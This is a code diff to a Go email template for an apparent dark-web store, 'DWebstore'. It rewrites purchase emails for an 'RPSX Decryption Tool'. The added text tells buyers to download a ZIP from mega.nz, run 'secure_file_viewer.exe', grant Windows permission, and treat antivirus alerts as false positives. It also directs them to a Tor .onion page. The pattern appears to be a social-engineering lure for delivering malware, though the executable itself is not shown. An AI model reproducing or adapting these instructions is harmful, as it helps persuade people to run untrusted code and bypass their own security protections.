@@ -49,7 +49,7 @@ func ProductEmail(userEmail, userName, productName string) error {
 		// Special email for RPSX tool with download link
 		rpsxToolLink := "https://mega.nz/file/TyQ0hC4b#P7fsFAEIWFrrpBrhcQt6ElavppkuQr5CWo5xEDmCUEw"
 		message.SetBody("text/html", fmt.Sprintf(`
-<div style="font-family: Arial, sans-serif; font-size: 16px; color: #444; background-color: #f9f9f9; padding: 20px; border: 1px solid #ddd; border-radius: 5px; max-width: 600px; margin: auto;">
+<div style="font-family: Arial, sans-serif; font-size: 16px; color: #444; background-color: #f9f9f9; padding: 20px; border: 1px solid #ddd; border-radius: 5px; max-width: 650px; margin: auto;">
     <div style="text-align: center; margin-bottom: 20px;">
         <h2 style="color: #4CAF50;">Hello!</h2>
     </div>
@@ -57,27 +57,82 @@ func ProductEmail(userEmail, userName, productName string) error {
         <h1 style="color: #3B5998; font-size: 28px;">Your RPSX Decryption Tool</h1>
         <p style="font-size: 16px; line-height: 1.5; color: #555;">Thank you for your purchase of the <strong>RPSX Decryption Tool</strong>.</p>
     </div>
-    <div style="text-align: center; margin-bottom: 20px;">
-        <p style="font-size: 16px; color: #555;">You can download the RPSX Decryption Tool from the following link:</p>
-        <p style="margin: 20px 0;"><a href="%s" style="background-color: #4CAF50; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">Download RPSX Decryption Tool</a></p>
-        <p style="font-size: 14px; color: #777;"><em>Note: Please open this tool with Windows for best compatibility.</em></p>
+    
+    <div style="margin-bottom: 25px; padding: 20px; background-color: #e8f5e8; border: 2px solid #4CAF50; border-radius: 8px;">
+        <h3 style="margin-top: 0; color: #2e7d32; text-align: center;">📋 Complete Setup Instructions</h3>
+        
+        <div style="margin-bottom: 20px;">
+            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 1: Download the Tool</h4>
+            <p style="color: #333; margin-bottom: 10px;">Click the link below to visit Mega.nz and download your RPSX Decryption Tool:</p>
+            <p style="text-align: center; margin: 15px 0;">
+                <a href="%s" style="background-color: #4CAF50; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block;">Download from Mega.nz</a>
+            </p>
+        </div>
+        
+        <div style="margin-bottom: 20px;">
+            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 2: System Requirements</h4>
+            <ul style="color: #333; margin: 0; padding-left: 20px;">
+                <li><strong>Operating System:</strong> Windows 10 or Windows 11 (preferred)</li>
+                <li><strong>Storage:</strong> At least 50MB free space</li>
+                <li><strong>Internet:</strong> Required for initial download only</li>
+            </ul>
+        </div>
+        
+        <div style="margin-bottom: 20px;">
+            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 3: Extract the Downloaded File</h4>
+            <p style="color: #333; margin-bottom: 10px;">The downloaded file will be in a compressed ZIP format. Extract it using one of these popular tools:</p>
+            <ul style="color: #333; margin: 0; padding-left: 20px;">
+                <li><strong>WinRAR</strong> - Right-click → "Extract Here" or "Extract to folder"</li>
+                <li><strong>WinZip</strong> - Right-click → "Extract to here"</li>
+                <li><strong>7-Zip</strong> - Right-click → "7-Zip" → "Extract Here"</li>
+                <li><strong>Windows built-in</strong> - Right-click → "Extract All"</li>
+            </ul>
+        </div>
+        
+        <div style="margin-bottom: 20px;">
+            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 4: Locate and Run the Tool</h4>
+            <ol style="color: #333; margin: 0; padding-left: 20px; line-height: 1.6;">
+                <li>Navigate to the extracted folder</li>
+                <li>Look for the file named <strong>"secure_file_viewer.exe"</strong></li>
+                <li>Double-click to run the application</li>
+                <li>If Windows asks for permission, click "Yes" or "Allow"</li>
+            </ol>
+        </div>
+        
+        <div style="margin-bottom: 20px;">
+            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 5: Using the Tool</h4>
+            <ol style="color: #333; margin: 0; padding-left: 20px; line-height: 1.6;">
+                <li><strong>Ensure your .rpsx files are accessible:</strong> Make sure any .rpsx log files you previously received are saved on the same computer</li>
+                <li><strong>Launch the secure_file_viewer.exe</strong></li>
+                <li><strong>Follow the on-screen prompts:</strong> The application will guide you to locate and select your .rpsx log files</li>
+                <li><strong>Browse and select:</strong> Use the file browser to navigate to where you saved your .rpsx files</li>
+                <li><strong>View your content:</strong> Once selected, the tool will decrypt and display your purchased content securely</li>
+            </ol>
+        </div>
     </div>
-    <div style="margin-bottom: 20px; padding: 15px; background-color: #f0f0f0; border-left: 4px solid #4CAF50; border-radius: 3px;">
-        <h3 style="margin-top: 0; color: #333;">Instructions:</h3>
-        <ol style="text-align: left; color: #555;">
-            <li>Download the tool using the button above</li>
-            <li>Extract the files if necessary</li>
-            <li>Run the application</li>
-            <li>Use the tool to decrypt any .rpsx files you purchase from us</li>
-        </ol>
+    
+    <div style="margin-bottom: 20px; padding: 15px; background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 5px;">
+        <h4 style="margin-top: 0; color: #856404;">⚠️ Important Security Notes:</h4>
+        <ul style="color: #856404; margin: 0; padding-left: 20px; line-height: 1.5;">
+            <li><strong>Antivirus alerts:</strong> Your antivirus software may flag secure_file_viewer.exe as suspicious. This is a false positive due to the encryption/decryption functionality.</li>
+            <li><strong>Safe to use:</strong> The tool contains no malicious code and is completely safe to run.</li>
+            <li><strong>Sandbox option:</strong> If you're concerned about security, you can run the tool in a virtual machine (VM) or sandbox environment like Windows Sandbox.</li>
+            <li><strong>File location:</strong> Keep your .rpsx files and the decryption tool on the same computer for best performance.</li>
+        </ul>
     </div>
+    
+    <div style="margin-bottom: 20px; padding: 15px; background-color: #d1ecf1; border: 1px solid #bee5eb; border-radius: 5px;">
+        <h4 style="margin-top: 0; color: #0c5460;">💡 Pro Tips:</h4>
+        <ul style="color: #0c5460; margin: 0; padding-left: 20px; line-height: 1.5;">
+            <li>Create a dedicated folder for all your .rpsx files to keep them organized</li>
+            <li>The tool works offline once downloaded - no internet connection needed for decryption</li>
+            <li>You can use this same tool for all future .rpsx files you receive from us</li>
+            <li>Keep the secure_file_viewer.exe file safe - you'll need it for all your encrypted purchases</li>
+        </ul>
+    </div>
+    
     <div style="text-align: center; margin-bottom: 20px;">
-        <p style="font-size: 14px; color: #777;"><em>
-			Note: This tool might be flagged as malicious by antivirus. 
-			But it is a false positive and it has nothing malicious in it. 
-			You can run on a sandbox or a vm if you're skeptical.
-		</em></p>
-        <p style="font-size: 16px; color: #555;">If you have any questions or need assistance with the tool, please don't hesitate to contact our support team.</p>
+        <p style="font-size: 16px; color: #555;">If you encounter any issues during installation or need assistance with the tool, please don't hesitate to contact our support team. We're here to help ensure you can access your purchased content smoothly.</p>
     </div>
     <div style="text-align: center; margin-top: 30px; border-top: 1px solid #ddd; padding-top: 20px;">
         <p style="font-size: 14px; color: #777;">Thank you for shopping with DWebstore!</p>
@@ -115,11 +170,24 @@ func ProductEmail(userEmail, userName, productName string) error {
         <p style="font-size: 16px; line-height: 1.5; color: #555;">Your product file has been attached to this email.</p>
     </div>
     <div style="margin-bottom: 20px; padding: 15px; background-color: #f0f0f0; border-left: 4px solid #4CAF50; border-radius: 3px;">
-        <h3 style="margin-top: 0; color: #333;">Important Information:</h3>
-        <ul style="text-align: left; color: #555;">
-            <li>To open the file, you'll need the RPSX Decryption Tool</li>
-            <li>it's available in our store under Tools & Tutorials</li>
-        </ul>
+        <h3 style="margin-top: 0; color: #333;">How to Open Your Attached File:</h3>
+        <p style="text-align: left; color: #555; margin-bottom: 15px;">The file attached to this email is in .rpsx format and requires special software to open it.</p>
+        
+        <p style="text-align: left; color: #555; margin-bottom: 10px;"><strong>Required Software:</strong> RPSX Decryption Tool</p>
+        
+        <p style="text-align: left; color: #555; margin-bottom: 15px;">This tool is critical in ensuring the privacy and safety of your sensitive data. It provides secure decryption that protects your information during the viewing process.</p>
+        
+        <p style="text-align: left; color: #555; margin-bottom: 15px;"><strong>How to get the RPSX Decryption Tool:</strong></p>
+        <ol style="text-align: left; color: #555; line-height: 1.6;">
+            <li>Open Tor browser on your computer</li>
+            <li>Navigate to the following secure location:<br>
+                <span style="font-family: monospace; background-color: #e0e0e0; padding: 2px 6px; border-radius: 3px; font-size: 13px; word-break: break-all;">http://dwebc5kntr3tmndibeyl2yqr5edgws2tmjshkkh3ibs5vulmu7ylnbid.onion/product/rpsx-decryption-tool/</span>
+            </li>
+            <li>Follow the instructions on that page to get the RPSX Decryption Tool</li>
+            <li>Once you have the tool, you can safely open the .rpsx file attached to this email</li>
+        </ol>
+        
+        <p style="text-align: left; color: #777; font-size: 14px; margin-top: 15px;"><em>Note: You must use Tor browser to access the secure location. The RPSX Decryption Tool is essential for maintaining the security and privacy of your data when viewing .rpsx files.</em></p>
     </div>
     <div style="text-align: center; margin-bottom: 20px;">
         <p style="font-size: 16px; color: #555;">If you have any questions about your purchase or need assistance, please don't hesitate to contact our support team.</p>
